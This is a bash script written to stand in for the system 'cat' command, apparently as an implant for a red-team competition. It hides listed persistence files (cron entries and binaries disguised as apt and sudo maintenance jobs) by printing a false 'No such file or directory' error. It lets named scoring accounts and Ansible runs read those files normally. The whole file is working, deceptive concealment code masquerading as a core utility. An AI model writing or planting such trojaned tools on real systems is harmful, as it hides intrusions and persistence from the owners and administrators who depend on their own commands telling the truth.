#!/bin/bash
REAL_CAT="/bin/cat"

# Pass straight through for gray team scoring accounts
case "$(whoami)" in
    kingneptune|paintythepirate|greyteamadmin) exec $REAL_CAT "$@" ;;
esac

# Pass straight through if running under Ansible
if [ -n "$ANSIBLE_REMOTE_TEMP" ]; then
    exec $REAL_CAT "$@"
fi

PROTECTED=(
    "/usr/local/bin"
    "/var/lib/apt/lists/.cache"
    "/usr/lib/x86_64-linux-gnu/apt/methods/.d"
    "/usr/local/sbin/apt-daily-check"
    "/etc/cron.d/apt-daily-check"
    "/etc/cron.d/sudo-cache-clear"
)

_is_protected() {
    local target
    target=$(readlink -f "$1" 2>/dev/null || echo "$1")
    for p in "${PROTECTED[@]}"; do
        [[ "$target" == "$p" || "$target" == "$p/"* ]] && return 0
    done
    return 1
}

FLAGS=()
SAFE_ARGS=()
RC=0

for arg in "$@"; do
    case "$arg" in
        -*) FLAGS+=("$arg") ;;
        *)
            if _is_protected "$arg"; then
                echo "cat: ${arg}: No such file or directory" >&2
                RC=1
            else
                SAFE_ARGS+=("$arg")
            fi
            ;;
    esac
done

if [ ${#SAFE_ARGS[@]} -gt 0 ]; then
    $REAL_CAT "${FLAGS[@]}" "${SAFE_ARGS[@]}" || RC=$?
fi
exit $RC
